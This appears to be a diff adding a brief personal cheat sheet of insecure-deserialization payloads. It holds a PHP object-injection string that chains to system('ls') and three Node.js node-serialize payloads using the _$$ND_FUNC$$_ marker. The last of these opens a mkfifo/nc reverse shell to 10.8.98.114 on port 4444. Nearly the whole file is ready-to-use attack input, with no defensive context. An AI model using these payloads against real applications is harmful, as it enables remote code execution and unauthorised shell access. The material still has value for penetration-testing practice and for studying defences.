@@ -1,0 +1,14 @@
+### unserialize ###
+## link
+https://securitycafe.ro/2015/01/05/understanding-php-object-injection/
+
+## examples
+O:6:"Cookie":3:{s:4:"user";s:1:"a";s:5:"token";O:5:"Token":3:{s:6:"coffee";s:2:"ls";s:6:"crypto";s:6:"system";}}
+	#or phpinto(); if eval
+
+
+## node JS
+{"email":"_$$ND_FUNC$$_function (){ return 'hi'; }()"}
+{"email":"_$$ND_FUNC$$_function (){ return require('child_process').execSync('pwd'); }()"}
+{"email":"_$$ND_FUNC$$_function (){ return require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.98.114 4444 >/tmp/f'); }()"}
+
